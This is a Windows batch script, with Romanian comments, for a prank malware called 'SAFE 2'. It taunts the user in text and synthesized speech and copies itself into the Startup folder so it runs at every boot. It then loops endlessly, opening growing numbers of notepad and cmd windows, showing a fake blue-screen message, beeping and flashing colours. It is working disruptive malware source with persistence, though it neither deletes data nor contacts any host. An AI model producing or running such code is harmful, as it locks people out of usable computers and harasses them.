@echo off
title SAFE 2 - AGRESIV MAXIM
color 0c
mode con cols=90 lines=30

echo.
echo ========================================================
echo     YOUR COMPUTER HAS BEEN FUCKED BY THE SAFE 2
echo ========================================================
echo.
echo      HAHAHAHAHA LOSER! YOU LOSE FOREVER!
echo.

:: Voce
powershell -Command "Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('YOUR COMPUTER HAS BEEN FUCKED BY THE SAFE 2')" >nul 2>&1

:: Persistență la restart
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\safe2.bat" >nul 2>&1

:: SPAM NOTEPAD + CMD FOARTE AGRESIV
set count=10

:loop

:: Deschide foarte multe ferestre
for /l %%i in (1,1,%count%) do (
    start notepad.exe
    start cmd.exe
)

:: Blue Screen foarte des
msg * "Your PC ran into a problem and needs to restart.^n^nSAFE 2 caused this :("

:: Sunete haotice puternice
powershell -c "[console]::beep(300,60);[console]::beep(600,80);[console]::beep(200,150);[console]::beep(900,40);[console]::beep(150,250)" >nul 2>&1

set /a count+=3
if %count% gtr 35 set count=35

:: Tunnel simulation (10 minute)
color 1f
timeout /t 1 >nul
color 9f
timeout /t 1 >nul
color 0c

goto loop